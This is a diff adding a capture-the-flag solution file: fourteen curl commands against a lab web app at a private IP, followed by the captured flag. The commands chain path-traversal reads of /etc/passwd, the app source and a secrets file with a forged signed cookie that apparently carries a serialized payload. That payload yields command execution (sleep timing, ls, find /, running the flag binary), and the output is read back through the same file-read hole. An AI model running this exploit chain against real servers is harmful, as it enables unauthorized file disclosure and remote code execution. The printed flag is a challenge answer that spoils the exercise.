@@ -1,0 +1,18 @@
+commands to test the challenge 
+1) curl http://192.168.25.128:8080/show?id=/etc/passwd
+2) curl http://192.168.25.128:8080/show?id=/proc/self/cmdline -o- | tr \\0 \\n
+3) curl http://192.168.25.128:8080/show?id=../../app/app.py
+4) curl http://192.168.25.128:8080/show?id=../../app/config/secret.py 
+5) curl http://192.168.25.128:8080/sign -H 'Cookie: name="!XMFYJFunsd7OYEotwPHtuw==?gAWVFwAAAAAAAACMBG5hbWWUfZRoAIwFYWRtaW6Uc4aULg=="'
+6) time curl http://192.168.25.128:8080/sign -H "$(/root/sign.py 'sleep 5')" -o /dev/null
+7) curl http://192.168.25.128:8080/sign -H "$(/root/sign.py 'ls > /tmp/test')" -o /dev/null
+8) curl http://192.168.25.128:8080/show?id=/tmp/test
+9) curl http://192.168.25.128:8080/sign -H "$(/root/sign.py 'ls > /tmp/test')" -o /dev/null
+10) curl http://192.168.25.128:8080/show?id=/../../tmp/test
+11) curl http://192.168.25.128:8080/sign -H "$(/root/sign.py 'find / > /tmp/test')" -o /dev/null
+12) curl http://192.168.25.128:8080/show?id=/tmp/test | grep flag
+13) curl http://192.168.25.128:8080/sign -H "$(/root/sign.py '/root/Downloads/challenge/flag/flag > /tmp/test')" -o /dev/null 
+14) curl http://192.168.25.128:8080/show?id=/tmp/test
+
+flag{W3lcome_t0_p03m_p0ck3t}
+
